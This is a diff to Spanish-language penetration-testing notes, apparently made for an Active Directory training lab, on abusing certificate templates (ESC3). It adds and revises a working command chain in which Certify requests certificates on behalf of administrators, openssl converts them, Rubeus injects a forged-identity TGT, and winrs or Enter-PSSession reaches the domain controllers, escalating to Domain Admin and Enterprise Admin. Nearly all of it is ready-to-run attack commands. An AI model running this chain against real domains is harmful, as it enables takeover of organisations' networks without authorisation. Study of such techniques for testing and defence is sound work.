@@ -15,6 +15,7 @@ Tags: #AD #ESC
 
 ```powershell 
 ❯ Certify.exe find
+❯ Certify.exe find /domain:domain.corp /ldapserver:dc.domain.corp 
 # Enumerar todas las plantillas de certificados disponibles en el bosque.
 
 
@@ -226,24 +227,27 @@ Paso 2 (Abusar de la forma 1):
 Paso 3 (Abusar de la forma 1):
 ❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
 	# esc3.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
-	# Colocar la password = SecretPass@123
+	# Colocar la password = Password123
 	# esc3-agent.pfx = Es el resultado del comando (IMPORTANTE)
 
 Paso 4 (Abusar de la forma 1):
-❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
+❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:Password123
 # Usar el certificado de agente (.pfx) para solicitar un certificado en nombre del Administrator usando la plantilla SmartCardEnrollment-Users — convierte cert.pem a .pfx antes de ejecutar
 
 Paso 5 (Abusar de la forma 1):
 ❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
 	# esc3-DA.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
-	# Solocar la password = SecretPass@123
+	# Solocar la password = Password123
 	# esc3-DA.pfx = Es el resultado del comando (IMPORTANTE)
 
 Paso 6 (Abusar de la forma 1):
-❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
+Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:Password123 /domain:domain.corp /ptt
+
+❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:Password123 /domain:domain.corp /ptt
 # Solicitar un TGT del Administrator usando el certificado obtenido e inyectarlo en la sesión actual — completa la escalada a DA vía ESC3
 
 Paso 7 (Abusar de la forma 1):
+❯ Enter-PSSession -ComputerName dc.domain.corp 
 ❯ winrs -r:dcorp-dc cmd /c set username
 ```
 
@@ -259,23 +263,26 @@ Paso 2 (Abusar de la forma 2):
 Paso 3 (Abusar de la forma 2):
 ❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
 	# esc3.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
-	# Solocar la password = SecretPass@123
+	# Solocar la password = Password123
 	# esc3-agent.pfx = Es el resultado del comando (IMPORTANTE)
 
 Paso 4 (Abusar de la forma 2):
-❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
+❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:Password123
 # Usar el certificado de agente para solicitar un certificado en nombre del Administrator del dominio padre (moneycorp.local) — escalada a Enterprise Admin vía ESC3.
 
 Paso 5 (Abusar de la forma 2):
 ❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
 	# esc3-EA.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
-	# Solocar la password = SecretPass@123
+	# Solocar la password = Password123
 	# esc3-EA.pfx = Es el resultado del comando (IMPORTANTE)
 
 Paso 6 (Abusar de la forma 2):
-❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
+❯ .\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /password:Password123 /ptt
+
+❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /password:Password123 /ptt
 # Solicitar un TGT del Administrator del dominio padre usando el certificado obtenido e inyectarlo en la sesión actual — completa la escalada a EA vía ESC3
 
 Paso 7 (Abusar de la forma 2):
+❯ Enter-PSSession -ComputerName father-dc.domain.corp  
 ❯ winrs -r:mcorp-dc cmd /c set username
 ```
